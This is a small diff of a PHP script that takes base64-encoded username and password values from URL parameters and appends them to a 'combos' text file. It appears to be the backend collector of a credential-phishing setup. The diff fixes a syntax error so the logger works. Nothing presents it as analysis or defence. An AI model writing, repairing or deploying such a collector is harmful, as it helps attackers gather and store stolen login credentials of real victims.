@@ -1,6 +1,6 @@
 <?php
-	var u = base64_decode(urldecode($_GET['u']));
-	var p = base64_decode(urldecode($_GET['p']));
+	$u = base64_decode(urldecode($_GET['u']));
+	$p = base64_decode(urldecode($_GET['p']));
 	$myfile = fopen("IDKspatk/combos[//RANDOM//].txt", "a") or die("50 ERROR");
 	fwrite($myfile, "\n". $u.' : '.$p);
 	fclose($myfile);
